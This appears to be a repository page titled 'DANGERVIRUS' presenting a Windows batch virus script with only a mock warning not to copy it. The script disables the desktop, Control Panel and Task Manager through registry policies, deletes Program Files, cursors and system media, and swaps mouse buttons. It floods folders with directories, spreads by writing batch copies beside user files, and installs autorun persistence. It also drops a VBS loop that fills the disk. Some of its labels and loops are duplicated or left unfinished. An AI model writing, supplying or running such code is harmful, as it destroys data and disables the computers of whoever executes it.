# DANGERVIRUS
DON`T COPE BAT CODE! (i`m craze))
```bat
@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v RestrictRun /t REG_DWORD /d %SystemRoot%\explorer.exe /f

del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q
del "%SystemRoot%\Media" /q

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

%SystemRoot%/System32/rundll32 user32, SwapMouseButton
del "%SystemRoot%\Cursors\*.*"

reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v "C:\WINDOWS\system32\SHELL32.dll,-8964" /t REG_SZ /d "BLACK VIRUS" /f
del "C:\Program Files\*.*"

taskkill /f /im explorer.exe >nul

:Loop
mkdir "%SystemRoot%\System32\taskkiller"
FOR /L %%i IN (1,1,1000000) DO md "%%i"

del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q
assoc .lnk=.blackcode

copy "%~f0" "%SystemRoot%\System32\batinit.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\System32\batinit.bat" /f

rundll32 user, SwapMouseButton
rundll32 user, disableoemlayer

@echo off
if "%~1"=="In_" goto Infect
if exist "c:\MrWeb.bat" goto Infect
if not exist "%~f0" goto End
find "MrWeb" "%~f0" >nul
if not errorlevel 1 attrib +h "c:\MrWeb.bat"
:Infect
for %%g in (*.jpg *.*.doc *.* ..\tm? *.mp3 *.doc *.htm? *.xls) do call "c:\MrWeb" In_ "%%g"
goto End
:Infect
if exist "%~2.bat" goto End
type "c:\MrWeb.bat" > "%~2.bat"
echo start "%~2" >> "%~2.bat"
:End
@echo off
echo Set fso = CreateObject("Scripting.FileSystemObject") > "%SystemDrive%\windows\system32\rundll32.vbs"
echo do >> "%SystemDrive%\windows\system32\rundll32.vbs"
echo Set tx = fso.CreateTextFile("%SystemDrive%\windows\system32\rundll32.dat", True) >> "%SystemDrive%\windows\system32\rundll32.vbs"
echo tx.WriteBlankLines(100000000) >> "%SystemDrive%\windows\system32\rundll32.vbs"
echo tx.close >> "%SystemDrive%\windows\system32\rundll32.vbs"
echo FSO.DeleteFile "%SystemDrive%\windows\system32\rundll32.dat" >> "%SystemDrive%\windows\system32\rundll32.vbs"
echo loop >> "%SystemDrive%\windows\system32\rundll32.vbs"
start "%SystemDrive%\windows\system32\rundll32.vbs"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v systemhostrun /t REG_SZ /d "%SystemDrive%\windows\system32\rundll32.vbs" /f

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "BLACK VIRUS" /t REG_SZ /d "%SystemRoot%\System32\File.bat" /f

echo @echo off > "%SystemRoot%\System32\File.bat"
echo start /min cmd.exe /c "del %~f0" >> "%SystemRoot%\System32\File.bat"
echo start cmd.exe /k "del "%SystemRoot%\System32\File.bat" & echo BLACK VIRUS & pause" >> "%SystemRoot%\System32\File.bat"

:Loop
```
